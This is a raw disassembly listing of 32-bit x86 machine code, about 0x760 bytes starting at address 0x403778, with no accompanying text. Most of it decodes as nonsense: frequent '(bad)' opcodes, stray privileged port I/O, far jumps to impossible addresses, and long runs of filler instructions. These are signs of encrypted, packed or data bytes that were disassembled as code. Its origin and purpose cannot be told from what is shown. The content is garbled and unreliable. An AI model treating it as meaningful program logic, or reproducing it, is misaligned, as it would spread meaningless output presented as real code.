  403778:	and    BYTE PTR [edi],al
  40377a:	pop    ecx
  40377b:	sub    BYTE PTR [eax+eiz*8],cl
  40377e:	(bad)  
  40377f:	inc    ecx
  403780:	adc    al,0x4
  403782:	push   edx
  403783:	lahf   
  403784:	adc    eax,0x53b2b76
  403789:	jne    0x403800
  40378b:	or     al,0x9
  40378d:	(bad)  
  40378e:	jmp    0x403786
  403790:	pop    ebp
  403791:	lock xor DWORD PTR [edx],0xf5244b63
  403798:	cmp    edi,DWORD PTR [edx+eax*4]
  40379b:	add    eax,0xaa476c26
  4037a0:	in     al,dx
  4037a1:	jmp    0x4037b1
  4037a3:	and    DWORD PTR [ebx+eax*4+0x39dc0e9b],esp
  4037aa:	scas   eax,DWORD PTR es:[edi]
  4037ab:	sub    ecx,DWORD PTR [eax-0x483f0359]
  4037b1:	mov    eax,DWORD PTR [edx]
  4037b3:	call   DWORD PTR [eax+0x8]
  4037b6:	sub    bl,BYTE PTR [ecx]
  4037b8:	or     BYTE PTR [ecx+ecx*2+0x5202e6d8],bh
  4037bf:	mov    esi,0x8f088b58
  4037c4:	and    ch,dh
  4037c6:	sub    al,dl
  4037c8:	rcl    BYTE PTR [eax],1
  4037ca:	mov    eax,DWORD PTR [ecx]
  4037cc:	push   ecx
  4037cd:	inc    eax
  4037ce:	xchg   ebx,eax
  4037cf:	mov    al,0x2d
  4037d1:	lock mov cl,0x28
  4037d4:	je     0x4037dc
  4037d6:	sbb    eax,0xc189bd4c
  4037db:	daa    
  4037dc:	xor    eax,0x715a65c
  4037e1:	shr    BYTE PTR [ecx],0x12
  4037e4:	adc    dl,BYTE PTR [ecx]
  4037e6:	jmp    DWORD PTR [ecx]
  4037e8:	pop    eax
  4037e9:	pop    eax
  4037ea:	mov    eax,ds:0xf4ee8c35
  4037ef:	lahf   
  4037f0:	and    al,0xa
  4037f2:	mov    edx,0x10b67660
  4037f7:	xor    al,0xc
  4037f9:	adc    BYTE PTR [edi],ch
  4037fb:	fs jbe 0x4037e1
  4037fe:	and    dh,BYTE PTR [eax+eax*4+0x5]
  403802:	mov    eax,0x150ac3c2
  403807:	push   ss
  403808:	sbb    BYTE PTR [eax+0xc],0x0
  40380c:	aaa    
  40380d:	mov    cl,0x0
  40380f:	sbb    dh,ah
  403811:	cmp    al,0xb3
  403813:	push   esp
  403814:	(bad)  
  403815:	xor    al,0x22
  403817:	mov    dh,0x4f
  403819:	xor    BYTE PTR [eax-0x73],bh
  40381c:	inc    ebx
  40381d:	fild   WORD PTR [edi-0x2f5c7bf7]
  403823:	sub    BYTE PTR [ebx+eax*8],al
  403826:	or     DWORD PTR ds:0x4c46e28f,ecx
  40382c:	push   eax
  40382d:	xchg   DWORD PTR [ecx+0x655b84d],ecx
  403833:	clc    
  403834:	fs xor al,0xd2
  403837:	push   ecx
  403838:	mov    eax,0x3c6b072f
  40383d:	jmp    0xa3096c38
  403842:	xchg   DWORD PTR [ebp-0x2d40c8],edi
  403848:	dec    DWORD PTR [edi]
  40384a:	mov    bh,0x14
  40384c:	dec    edx
  40384d:	inc    ecx
  40384e:	cmp    edx,0x7f
  403851:	ja     0x403859
  403853:	mov    BYTE PTR [eax+esi*1],dl
  403856:	inc    esi
  403857:	jmp    0x4038b2
  403859:	cmp    edx,0x8d3176aa
  40385f:	pop    esi
  403860:	sbb    ecx,esi
  403862:	das    
  403863:	clc    
  403864:	add    edi,DWORD PTR [ebx]
  403866:	pop    ebp
  403867:	cld    
  403868:	ja     0x4038be
  40386a:	fcmovb st,st(1)
  40386c:	jmp    0x40387a
  40386e:	or     bl,0xe0
  403871:	mov    BYTE PTR [edx],bh
  403873:	fdiv   QWORD PTR [edi+edi*4-0x7ff9eb03]
  40387a:	jecxz  0x4038bb
  40387c:	sbb    al,BYTE PTR [eax+0x1305c88]
  403882:	and    dl,0x12
  403885:	retf   0x3054
  403888:	add    bh,BYTE PTR [ebp-0x2bbaa4b6]
  40388e:	jmp    0x4038b0
  403890:	pusha  
  403891:	add    ah,BYTE PTR [edx]
  403893:	dec    ebx
  403894:	mov    edi,0x60a76399
  403899:	rol    BYTE PTR [ebx+0x1],0x38
  40389d:	dec    ebp
  40389e:	or     BYTE PTR [ebx+0x5],dh
  4038a1:	cmp    esi,DWORD PTR [ebp-0x52]
  4038a4:	loopne 0x403873
  4038a6:	out    dx,al
  4038a7:	cld    
  4038a8:	jb     0x403834
  4038aa:	or     DWORD PTR [ebx+ecx*4],eax
  4038ad:	dec    esi
  4038ae:	mov    BYTE PTR [eax+esi*1],0x8
  4038b2:	and    dh,BYTE PTR [ecx]
  4038b4:	add    eax,0x1d8b072b
  4038b9:	adc    cl,BYTE PTR ds:[eax+0x76]
  4038bd:	or     al,BYTE PTR [edi]
  4038bf:	ds or  bh,dh
  4038c2:	in     al,dx
  4038c3:	add    DWORD PTR [esi+0x0],eax
  4038c6:	cmp    BYTE PTR [edx-0x1d],dh
  4038c9:	lea    edx,[esi-0x40]
  4038cc:	ret    0xb187
  4038cf:	sbb    BYTE PTR [edi+0x8],ah
  4038d2:	mov    bh,0xf0
  4038d4:	fnstsw WORD PTR gs:[esi+eiz*1]
  4038d8:	sbb    dh,BYTE PTR [edx+0x44f0d100]
  4038de:	faddp  st(7),st
  4038e0:	add    eax,0xe921682
  4038e5:	pop    ecx
  4038e6:	rcl    dh,0xee
  4038e9:	cld    
  4038ea:	retf   0x46e8
  4038ed:	cmp    ah,dl
  4038ef:	xor    esi,DWORD PTR [ecx+0xb]
  4038f2:	pop    esp
  4038f3:	jg     0x403876
  4038f5:	scas   al,BYTE PTR es:[edi]
  4038f6:	cli    
  4038f7:	mov    cl,BYTE PTR [edx+esi*1]
  4038fa:	inc    esi
  4038fb:	test   cl,0x80
  4038fe:	stos   BYTE PTR es:[edi],al
  4038ff:	or     al,0x8
  403901:	(bad)  
  403903:	mov    bh,0x1f
  403905:	test   BYTE PTR [ebx+0x3fe18338],al
  40390b:	and    BYTE PTR [eax],ah
  40390d:	je     0x40393d
  40390f:	cmp    al,0x8a
  403911:	adc    al,0x38
  403913:	(bad)  
  403915:	mov    edi,0x80da8b38
  40391a:	jecxz  0x4038dc
  40391c:	cmp    bl,0x80
  40391f:	jne    0xdaf284e0
  403925:	jg     0x403934
  403927:	cmp    al,0x98
  403929:	and    edx,0x6e1c1f8
  40392f:	or     edx,ecx
  403931:	mov    ecx,edx
  403933:	pop    ebx
  403934:	sar    BYTE PTR [edi+0x17],1
  403937:	cmp    ecx,DWORD PTR [ebp+0x4d4a6649]
  40393d:	cld    
  40393e:	mov    WORD PTR [ecx+eax*2],dx
  403942:	mov    bl,0xc0
  403944:	jle    0x4038e3
  403946:	pop    eax
  403947:	push   ebp
  403948:	adc    BYTE PTR [edx+eax*2],cl
  40394b:	inc    eax
  40394c:	call   0xdc3b:0x5d3b09d6
  403953:	loopne 0x4038d7
  403955:	jo     0x40399b
  403957:	adc    BYTE PTR [eax],dl
  403959:	or     BYTE PTR [eax+0x3d],cl
  40395c:	(bad)  
  40395d:	cmp    DWORD PTR [eax-0x23],edi
  403960:	lds    eax,FWORD PTR [edx+eax*2]
  403963:	and    al,0x47
  403965:	inc    ebx
  403966:	inc    edx
  403967:	mov    bh,0x4c
  403969:	ret    0x293
  40396c:	mov    ebx,0x352130ae
  403971:	scas   al,BYTE PTR es:[edi]
  403972:	sbb    BYTE PTR [esp+edx*1-0x65],al
  403976:	pop    eax
  403977:	mul    DWORD PTR [esi+0x1c]
  40397a:	in     al,0xfa
  40397c:	xor    BYTE PTR [ebp+0x1e],0x37
  403980:	sbb    DWORD PTR [edi],esp
  403982:	or     al,bh
  403984:	mov    cl,0x13
  403986:	dec    edi
  403987:	mov    eax,0xab40be72
  40398c:	jge    0x403948
  40398e:	adc    al,0x4
  403990:	enter  0xd6ef,0x31
  403994:	loope  0x40393a
  403996:	inc    ebx
  403997:	jbe    0x403974
  403999:	(bad)  
  40399a:	push   ebp
  40399b:	(bad)  
  40399c:	jno    0x403950
  40399e:	not    BYTE PTR [edx+0x64e84c3]
  4039a4:	retf   0x145e
  4039a7:	add    DWORD PTR [eax-0x3e],esp
  4039aa:	pop    esi
  4039ab:	sbb    DWORD PTR [ebp+0x66c10c14],ecx
  4039b1:	dec    DWORD PTR [ebx+ebx*8+0x23]
  4039b5:	sbb    al,0x1f
  4039b7:	das    
  4039b8:	inc    esp
  4039b9:	inc    eax
  4039ba:	push   eax
  4039bb:	and    eax,DWORD PTR [esi+eiz*2]
  4039be:	xchg   edi,eax
  4039bf:	pop    esp
  4039c0:	dec    edi
  4039c1:	xor    DWORD PTR [esi+edi*2],esi
  4039c4:	add    BYTE PTR [edx-0x28],0x83
  4039c8:	xchg   edi,eax
  4039c9:	sbb    eax,0xd08b0df6
  4039ce:	dec    edx
  4039cf:	outs   dx,DWORD PTR ds:[esi]
  4039d0:	jmp    0x4039da
  4039d2:	adc    edi,DWORD PTR [esi+eax*8-0x3570cc38]
  4039d9:	inc    ecx
  4039da:	jmp    0x403981
  4039dc:	xchg   esi,eax
  4039dd:	push   ebp
  4039de:	cmp    eax,0x858b12e
  4039e3:	adc    DWORD PTR [edi],ebp
  4039e5:	xchg   ebp,eax
  4039e6:	xchg   esi,eax
  4039e7:	mov    esp,0x56335708
  4039ec:	mov    cs,WORD PTR [eax+esi*2+0x70]
  4039f0:	cmp    BYTE PTR [ebp+ebx*2+0x5ed81201],0xb0
  4039f8:	cmp    ebp,esi
  4039fa:	test   DWORD PTR [edx+0x14344721],ecx
  403a00:	pop    ds
  403a01:	or     al,0x13
  403a03:	dec    esp
  403a04:	xor    al,0x23
  403a06:	add    al,0x47
  403a08:	inc    ebx
  403a09:	mov    ah,0x43
  403a0b:	push   es
  403a0c:	jns    0x403a2e
  403a0e:	xor    al,0xf0
  403a10:	xor    cl,BYTE PTR [eax+0x6]
  403a13:	jns    0x4039dd
  403a15:	xor    ah,ah
  403a17:	cmp    dl,BYTE PTR [esi+0x32]
  403a1a:	ss (bad) 
  403a1c:	or     eax,0xaf5c8399
  403a21:	xor    esi,esp
  403a23:	in     al,0x90
  403a25:	scas   eax,DWORD PTR es:[edi]
  403a26:	add    DWORD PTR [ecx],eax
  403a28:	(bad)  
  403a29:	sahf   
  403a2a:	inc    esp
  403a2b:	in     al,dx
  403a2c:	mov    cl,BYTE PTR [ebx]
  403a2e:	test   eax,0x3942365
  403a33:	shl    BYTE PTR [esi-0x2e],cl
  403a36:	xor    esi,DWORD PTR [ebp+0x3d]
  403a39:	cmp    DWORD PTR [ebx+0x2a],0x372a7d42
  403a40:	push   ds
  403a41:	xor    ecx,DWORD PTR [esi+0x6c]
  403a44:	mov    ds:0x13fb038b,eax
  403a49:	aam    0x8c
  403a4b:	mov    al,0x3b
  403a4d:	mov    WORD PTR [ebx-0x3a],fs
  403a50:	enter  0xcf9e,0x83
  403a54:	cmovo  eax,esi
  403a57:	xor    ecx,DWORD PTR [edx]
  403a59:	adc    BYTE PTR [ebx+0x4],0x2e
  403a5d:	fdiv   DWORD PTR [esi+eax*4-0x4d]
  403a61:	mov    al,ds:0x5fae6996
  403a66:	aas    
  403a67:	or     al,0xa3
  403a69:	mov    eax,ds:0x4e0684b8
  403a6e:	push   edi
  403a6f:	or     esp,DWORD PTR [edi-0x3]
  403a72:	daa    
  403a73:	push   0x7
  403a75:	lea    edx,[ebp-0xb]
  403a78:	push   edx
  403a79:	push   0xaf407bf6
  403a7e:	loopne 0x403a87
  403a80:	xor    al,dh
  403a82:	and    bh,BYTE PTR [ecx-0x25dfe10e]
  403a88:	xchg   ebx,esi
  403a8a:	das    
  403a8b:	sbb    BYTE PTR [ebx-0x2715e3df],cl
  403a91:	repnz sub ah,dl
  403a94:	xor    cl,BYTE PTR [ebx]
  403a96:	push   0x7d
  403a98:	push   ebp
  403a99:	push   edi
  403a9a:	pop    esp
  403a9b:	es or  al,0xa4
  403a9e:	lock jnp 0x403a87
  403aa1:	sub    esi,ecx
  403aa3:	and    BYTE PTR [ebx],bh
  403aa5:	daa    
  403aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aa7:	push   edi
  403aa8:	inc    DWORD PTR ds:0x237532b4
  403aae:	add    DWORD PTR [edi],0xb0b8899d
  403ab4:	jbe    0x403a8e
  403ab6:	in     al,dx
  403ab7:	fwait
  403ab8:	mov    esp,0xe01370bd
  403abd:	arpl   WORD PTR [eax],cx
  403abf:	or     edi,DWORD PTR [eax-0x48f04541]
  403ac5:	jae    0x403a74
  403ac7:	scas   eax,DWORD PTR es:[edi]
  403ac8:	clc    
  403ac9:	sub    DWORD PTR ds:0x5420185,0x7e
  403ad1:	stos   BYTE PTR es:[edi],al
  403ad2:	sbb    ch,al
  403ad4:	mov    BYTE PTR ds:0xdf02e608,0x65
  403adb:	pop    ebx
  403adc:	adc    eax,0x60463467
  403ae1:	add    BYTE PTR [eax],ah
  403ae3:	test   al,0x48
  403ae5:	mov    edx,0xa630c8b3
  403aea:	and    BYTE PTR [ecx+edx*1],ch
  403aed:	pop    esp
  403aee:	fbld   TBYTE PTR [edi+0x660112b5]
  403af4:	cmp    cl,BYTE PTR [eax+esi*4-0x29]
  403af8:	adc    BYTE PTR [eax],bl
  403afa:	(bad)
  403aff:	in     al,0x63
  403b01:	adc    DWORD PTR [ebx+eiz*4+0x12b04d3c],esi
  403b08:	fidivr WORD PTR [esi]
  403b0a:	add    dh,BYTE PTR [ebx+eiz*4+0x38]
  403b0e:	adc    ebp,DWORD PTR [ebp+eiz*1-0x4b]
  403b12:	mov    ds:0x8fcad655,eax
  403b17:	sub    eax,0x2766cf21
  403b1c:	xchg   BYTE PTR [edx-0x4789c9b2],bl
  403b22:	cdq    
  403b23:	jmp    0x403b45
  403b25:	fisttp QWORD PTR [ebx]
  403b27:	rcl    DWORD PTR [ecx],0xa7
  403b2a:	in     al,dx
  403b2b:	in     al,0xa3
  403b2d:	sub    BYTE PTR ds:0x20a42ddc,ch
  403b33:	emms   
  403b35:	mov    fs:0xa0a6dc30,eax
  403b3b:	outs   dx,BYTE PTR ds:[esi]
  403b3c:	scas   eax,DWORD PTR es:[edi]
  403b3d:	jmp    DWORD PTR ds:0xfcc6fd0
  403b43:	enter  0x6b8c,0xbc
  403b47:	pushf  
  403b48:	les    edx,FWORD PTR [eax+0x6a]
  403b4b:	or     BYTE PTR [eax+0x5e],0x58
  403b4f:	sbb    ch,BYTE PTR ds:0x8eaeb8ef
  403b55:	test   DWORD PTR [edi-0x53dc1701],eax
  403b5b:	inc    ebp
  403b5c:	cmp    DWORD PTR ss:0x8ff0c98,0x1f
  403b64:	dec    ebp
  403b65:	sub    cl,al
  403b67:	loop   0x403b50
  403b69:	dec    eax
  403b6a:	mov    al,ds:0x55a7dd74
  403b6f:	fimul  WORD PTR [ecx+ebp*1]
  403b72:	jmp    0x403b80
  403b74:	push   eax
  403b75:	mov    eax,ds:0x98375053
  403b7a:	mov    edi,0x2877401b
  403b7f:	mov    cl,BYTE PTR ds:0x84250e5c
  403b85:	leave  
  403b86:	jne    0x403bae
  403b88:	mov    edx,DWORD PTR fs:[eax+0x15c2f5f6]
  403b8f:	sub    al,0x2f
  403b91:	cmp    BYTE PTR [ecx-0x4c],0x57
  403b95:	fmul   DWORD PTR [ebx-0x8]
  403b98:	add    edi,DWORD PTR [edx]
  403b9a:	add    ebx,eax
  403b9c:	mov    eax,ds:0x31215668
  403ba1:	mov    edx,0xc3dbfdc2
  403ba6:	mov    eax,0x703e409c
  403bab:	outs   dx,BYTE PTR ds:[esi]
  403bac:	mov    ebp,0xabb79c33
  403bb1:	arpl   WORD PTR [ecx+0x60a38048],di
  403bb7:	fldlg2 
  403bb9:	(bad)  
  403bbb:	mov    bh,0x9
  403bbd:	mov    ds:0xa4382aa0,eax
  403bc2:	or     eax,0xc2ec69a8
  403bc7:	pop    es
  403bc8:	out    dx,al
  403bc9:	dec    ecx
  403bca:	cmp    BYTE PTR [edx+0xc2a517d],bh
  403bd0:	out    0x71,eax
  403bd2:	fsub   QWORD PTR [ebx+edi*2]
  403bd5:	pop    edi
  403bd6:	mov    cl,0x59
  403bd8:	fs jle 0x403bf0
  403bdb:	loopne 0x403b7b
  403bdd:	mov    al,0xe4
  403bdf:	mov    eax,0x3d2dc659
  403be4:	add    esi,DWORD PTR [edx-0x37]
  403be7:	dec    ebp
  403be8:	xor    BYTE PTR [edi-0x17],ch
  403beb:	ins    BYTE PTR es:[edi],dx
  403bec:	lock pop ebp
  403bee:	aam    0x72
  403bf0:	and    al,0x6c
  403bf2:	jbe    0x403c66
  403bf4:	pushf  
  403bf5:	pushf  
  403bf6:	fsub   QWORD PTR [edx]
  403bf8:	addps  xmm2,XMMWORD PTR [eax+edx*2-0x64]
  403bfd:	pushf  
  403bfe:	pushf  
  403bff:	pushf  
  403c00:	dec    esp
  403c01:	dec    eax
  403c02:	inc    esp
  403c03:	inc    eax
  403c04:	pushf  
  403c05:	pushf  
  403c06:	pushf  
  403c07:	pushf  
  403c08:	cmp    al,0x38
  403c0a:	xor    al,0x30
  403c0c:	pushf  
  403c0d:	pushf  
  403c0e:	pushf  
  403c0f:	pushf  
  403c10:	sub    al,0x28
  403c12:	and    al,0x20
  403c14:	pushf  
  403c15:	pushf  
  403c16:	pushf  
  403c17:	pushf  
  403c18:	sbb    al,0x18
  403c1a:	adc    al,0x10
  403c1c:	pushf  
  403c1d:	pushf  
  403c1e:	pushf  
  403c1f:	pushf  
  403c20:	or     al,0x8
  403c22:	add    al,0x0
  403c24:	dec    esi
  403c25:	dec    esi
  403c26:	inc    esi
  403c27:	sahf   
  403c28:	cld    
  403c29:	jno    0x403c23
  403c2b:	hlt    
  403c2c:	lock dec esi
  403c2e:	dec    esi
  403c2f:	dec    esi
  403c30:	dec    esi
  403c31:	in     al,dx
  403c32:	call   0x4f641d1b
  403c37:	dec    esi
  403c38:	dec    esi
  403c39:	(bad)  
  403c3b:	mov    al,0x72
  403c3d:	lods   al,BYTE PTR ds:[esi]
  403c3e:	daa    
  403c3f:	daa    
  403c40:	daa    
  403c41:	daa    
  403c42:	test   al,0xa4
  403c44:	mov    al,ds:0x2727279c
  403c49:	daa    
  403c4a:	cwde   
  403c4b:	xchg   esp,eax
  403c4c:	nop
  403c4d:	mov    WORD PTR [edi],fs
  403c4f:	daa    
  403c50:	daa    
  403c51:	daa    
  403c52:	mov    BYTE PTR [eax+eax*4+0x2727277c],al
  403c59:	daa    
  403c5a:	js     0x403cd0
  403c5c:	jo     0x403cca
  403c5e:	daa    
  403c5f:	daa    
  403c60:	daa    
  403c61:	daa    
  403c62:	push   0x27d0d8d4
  403c67:	daa    
  403c68:	daa    
  403c69:	daa    
  403c6a:	int3   
  403c6b:	enter  0xc0c4,0x77
  403c6f:	sub    al,0x27
  403c71:	daa    
  403c72:	mov    esp,0x24195fb8
  403c77:	pop    es
  403c78:	fs xchg edx,eax
  403c7a:	pop    esp
  403c7b:	jo     0x403c9d
  403c7d:	pop    esp
  403c7e:	(bad)  [edx-0x668fcd2f]
  403c84:	lock fmul QWORD PTR [edi]
  403c87:	icebp  
  403c88:	daa    
  403c89:	daa    
  403c8a:	daa    
  403c8b:	daa    
  403c8c:	repnz repz hlt 
  403c8f:	cmc    
  403c90:	daa    
  403c91:	daa    
  403c92:	daa    
  403c93:	daa    
  403c94:	div    bh
  403c96:	clc    
  403c97:	stc    
  403c98:	daa    
  403c99:	daa    
  403c9a:	daa    
  403c9b:	daa    
  403c9c:	cli    
  403c9d:	sti    
  403c9e:	cld    
  403c9f:	std    
  403ca0:	daa    
  403ca1:	daa    
  403ca2:	daa    
  403ca3:	daa    
  403ca4:	(bad)  
  403ca5:	jmp    eax
  403ca7:	loope  0x403cd0
  403ca9:	daa    
  403caa:	daa    
  403cab:	daa    
  403cac:	loop   0x403c91
  403cae:	in     al,0xe5
  403cb0:	daa    
  403cb1:	daa    
  403cb2:	daa    
  403cb3:	daa    
  403cb4:	out    0xe7,al
  403cb6:	call   0x276764a4
  403cbb:	daa    
  403cbc:	jmp    0x2727:0x27edeceb
  403cc3:	daa    
  403cc4:	out    dx,al
  403cc5:	out    dx,eax
  403cc6:	rcl    cl,1
  403cc8:	daa    
  403cc9:	daa    
  403cca:	daa    
  403ccb:	daa    
  403ccc:	rcl    bl,cl
  403cce:	aam    0xd5
  403cd0:	daa    
  403cd1:	daa    
  403cd2:	daa    
  403cd3:	daa    
  403cd4:	(bad)  
  403cd5:	xlat   BYTE PTR ds:[ebx]
  403cd6:	fcomp  st(1)
  403cd8:	daa    
  403cd9:	daa    
  403cda:	daa    
  403cdb:	daa    
  403cdc:	fcmovu st,st(3)
  403cde:	(bad)  
  403ce0:	daa    
  403ce1:	daa    
  403ce2:	daa    
  403ce3:	daa    
  403ce4:	(bad)  
  403ce6:	rol    cl,0x27
  403ce9:	daa    
  403cea:	daa    
  403ceb:	daa    
  403cec:	ret    0xc4c3
  403cef:	lds    esp,FWORD PTR [edi]
  403cf1:	daa    
  403cf2:	daa    
  403cf3:	daa    
  403cf4:	mov    bh,0xc8
  403cf7:	leave  
  403cf8:	daa    
  403cf9:	daa    
  403cfa:	daa    
  403cfb:	daa    
  403cfc:	retf   0xcccb
  403cff:	int    0x93
  403d01:	xchg   ebx,eax
  403d02:	xchg   ebx,eax
  403d03:	and    eax,DWORD PTR [eax]
  403d05:	into   
  403d06:	iret   
  403d07:	mov    al,0x93
  403d09:	xchg   ebx,eax
  403d0a:	xchg   ebx,eax
  403d0b:	xchg   ebx,eax
  403d0c:	mov    cl,0xb2
  403d0e:	mov    bl,0xb4
  403d10:	xchg   ebx,eax
  403d11:	xchg   ebx,eax
  403d12:	xchg   ebx,eax
  403d13:	xchg   ebx,eax
  403d14:	mov    ch,0xb6
  403d16:	mov    bh,0xb8
  403d18:	xchg   ebx,eax
  403d19:	xchg   ebx,eax
  403d1a:	xchg   ebx,eax
  403d1b:	xchg   ebx,eax
  403d1c:	mov    ecx,0x93bcbbba
  403d21:	xchg   ebx,eax
  403d22:	xchg   ebx,eax
  403d23:	xchg   ebx,eax
  403d24:	mov    ebp,0x93a0bfbe
  403d29:	xchg   ebx,eax
  403d2a:	xchg   ebx,eax
  403d2b:	xchg   ebx,eax
  403d2c:	mov    eax,ds:0x93a4a3a2
  403d31:	xchg   ebx,eax
  403d32:	xchg   ebx,eax
  403d33:	xchg   ebx,eax
  403d34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d37:	test   al,0x64
  403d39:	xchg   edx,eax
  403d3a:	aaa    
  403d3b:	popf   
  403d3c:	test   eax,0x745f210f
  403d41:	out    dx,al
  403d42:	xor    ah,BYTE PTR [edi+eax*1]
  403d45:	sub    BYTE PTR [edi+0x74],bl
  403d48:	sub    BYTE PTR [esi],0x87
  403d4b:	push   cs
  403d4c:	jmp    0x403d10
  403d4e:	add    DWORD PTR [esi],edx
  403d50:	addr16 xchg edx,eax
  403d52:	pop    edi
  403d53:	setp   BYTE PTR [ebp+eiz*1-0x66fff1b1]
  403d5b:	lods   al,BYTE PTR ds:[esi]
  403d5c:	adc    BYTE PTR [ecx-0x1d],bl
  403d5f:	mov    ebx,0xffc0ed65
  403d64:	or     DWORD PTR [ebp+0x78],eax
  403d67:	arpl   WORD PTR [ebp+0x70],sp
  403d6a:	je     0x403dd5
  403d6c:	outs   dx,DWORD PTR ds:[esi]
  403d6d:	outs   dx,BYTE PTR ds:[esi]
  403d6e:	xor    cl,BYTE PTR [edi+0x379f21fc]
  403d74:	inc    ebp
  403d75:	pop    ds
  403d76:	call   0x5f744e49
  403d7b:	jge    0x403d69
  403d7d:	dec    edi
  403d7e:	dec    esi
  403d7f:	les    esp,FWORD PTR [ebx+0x61654845]
  403d85:	jo     0x403d3c
  403d87:	nop
  403d88:	inc    esp
  403d89:	pusha  
  403d8a:	stc    
  403d8b:	outs   dx,BYTE PTR ds:[esi]
  403d8c:	push   eax
  403d8d:	xlat   BYTE PTR gs:[ebx]
  403d8f:	ds mov bh,0x9c
  403d92:	adc    esi,edi
  403d94:	jmp    FWORD PTR [edx]
  403d96:	or     al,0x45
  403d98:	dec    edi
  403d99:	jne    0x403e0f
  403d9b:	dec    edi
  403d9c:	dec    bp
  403d9e:	gs ins DWORD PTR es:[edi],dx
  403da0:	outs   dx,DWORD PTR ds:[esi]
  403da1:	jb     0x403e1c
  403da3:	mov    fs,WORD PTR [ecx-0x3f]
  403da6:	sub    eax,0x3eb7a05a
  403dab:	outs   dx,DWORD PTR ds:[esi]
  403dac:	pop    edx
  403dad:	sti    
  403dae:	jge    0x403d5a
  403db0:	aas    
  403db1:	or     eax,DWORD PTR [ebp+0x49]
  403db4:	outs   dx,BYTE PTR ds:[esi]
  403db5:	mov    edx,0xb6727245
  403dba:	clc    
  403dbb:	scas   eax,DWORD PTR es:[edi]
  403dbc:	xor    BYTE PTR [eax+eax*2-0x293507d2],ch
  403dc3:	test   ebp,ecx
  403dc5:	push   0x16
  403dc7:	je     0x403d4f
  403dc9:	popa   
  403dca:	ins    BYTE PTR es:[edi],dx
  403dcb:	mov    esi,0xe4a9af61
  403dd0:	ja     0x403d5b
  403dd2:	ds scas eax,DWORD PTR es:[edi]
  403dd4:	lods   al,BYTE PTR ds:[esi]
  403dd5:	pusha  
  403dd6:	mov    ds:0x1290c34d,al
  403ddb:	xlat   BYTE PTR ds:[ebx]
  403ddc:	mov    al,0xbf
  403dde:	ret    
  403ddf:	loope  0x403deb
  403de1:	in     al,0xb0
  403de3:	or     DWORD PTR [esi],ebx
  403de5:	sbb    edi,DWORD PTR [ebx+0x6e20b244]
  403deb:	or     BYTE PTR [edx+0x3e],ah
  403dee:	scas   eax,DWORD PTR es:[edi]
  403def:	cld    
  403df0:	call   DWORD PTR [edx+esi*8+0x64]
  403df4:	popa   
  403df5:	or     al,BYTE PTR [ebp+0x44]
  403df8:	imul   esi,DWORD PTR [esi+0x42],0x72655a79
  403dff:	outs   dx,DWORD PTR ds:[esi]
  403e00:	nop
  403e01:	pusha  
  403e02:	bound  eax,QWORD PTR ds:0xe4609172
  403e08:	mov    ds:0x527ebe5d,al
  403e0d:	popa   
  403e0e:	outs   dx,BYTE PTR ds:[esi]
  403e0f:	addr16 gs mov eax,0x66feb8af
  403e16:	(bad)  
  403e17:	or     ah,dh
  403e19:	dec    ecx
  403e1a:	outs   dx,BYTE PTR ds:[esi]
  403e1b:	jbe    0x403e82
  403e1d:	jb     0x403e85
  403e1f:	ins    BYTE PTR es:[edi],dx
  403e20:	outs   dx,DWORD PTR ds:[esi]
  403e21:	ja     0x403e63
  403e23:	dec    esi
  403e24:	xor    al,0x7c
  403e26:	adc    al,0x63
  403e28:	(bad)  
  403e29:	adc    al,0x63
  403e2b:	rol    BYTE PTR [eax],0x34
  403e2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e2f:	push   ss
  403e30:	dec    ebp
  403e31:	mov    esp,fs
  403e33:	leave  
  403e34:	inc    ebp
  403e35:	sti    
  403e36:	gs nop
  403e38:	ins    BYTE PTR es:[edi],dx
  403e39:	scas   eax,DWORD PTR es:[edi]
  403e3a:	ins    BYTE PTR es:[edi],dx
  403e3b:	enter  0xfb62,0x1d
  403e3f:	pop    es
  403e40:	stos   DWORD PTR es:[edi],eax
  403e41:	data16 jbe 0x403e74
  403e44:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x86afc490
  403e4c:	adc    eax,0xc6c445c8
  403e51:	mov    ds:0x6d1616dd,al
  403e56:	jle    0x403e0a
  403e58:	gs sbb al,0x64
  403e5b:	scas   eax,DWORD PTR es:[edi]
  403e5c:	and    DWORD PTR [ebx],0x5
  403e5f:	jb     0x403e7d
  403e61:	fs (bad) 
  403e63:	sar    DWORD PTR [eax-0x29f714bb],0x74
  403e6a:	scas   eax,DWORD PTR es:[edi]
  403e6b:	ds mov ah,0xb3
  403e6e:	scas   eax,DWORD PTR es:[edi]
  403e6f:	pusha  
  403e70:	andnps xmm5,XMMWORD PTR [esi+0x64]
  403e74:	mov    cl,0x90
  403e76:	int3   
  403e77:	scas   eax,DWORD PTR es:[edi]
  403e78:	sbb    al,0x41
  403e7a:	sbb    BYTE PTR [ebx+0x3e],0xf
  403e7e:	paddsw mm6,QWORD PTR [ebp+0x50bf30f5]
  403e85:	outs   dx,DWORD PTR ds:[esi]
  403e86:	imul   edx,DWORD PTR [eax],0x2eb76528
  403e8c:	loopne 0x403e78
  403e8e:	adc    bh,BYTE PTR [edi]
  403e90:	or     al,0x5f
  403e92:	or     al,0x17
  403e94:	in     eax,dx
  403e95:	jecxz  0x403e5a
  403e97:	mov    bh,0x43
  403e99:	popa   
  403e9a:	jae    0x403f10
  403e9c:	fiadd  WORD PTR [edi+esi*4+0x57d70784]
  403ea3:	and    BYTE PTR ds:0xd24a4345,cl
  403ea9:	je     0x403e36
  403eab:	ss push esp
  403ead:	scas   eax,DWORD PTR es:[edi]
  403eae:	loopne 0x403e67
  403eb0:	ds pop esp
  403eb2:	sbb    BYTE PTR [edi],0x41
  403eb5:	xchg   edi,eax
  403eb6:	adc    BYTE PTR [ebp+0x41],al
  403eb9:	arpl   WORD PTR [esi],cx
  403ebb:	jae    0x403f30
  403ebd:	push   esi
  403ebe:	jl     0x403ef2
  403ec0:	rol    BYTE PTR [edx],0x10
  403ec3:	ins    BYTE PTR es:[edi],dx
  403ec4:	popa   
  403ec5:	sbb    edx,DWORD PTR [esi+0x40]
  403ec8:	data16 sbb al,0x8
  403ecb:	cmp    DWORD PTR [ecx+0x72506640],edx
  403ed1:	mov    ecx,0xf07eab68
  403ed6:	ins    BYTE PTR es:[edi],dx
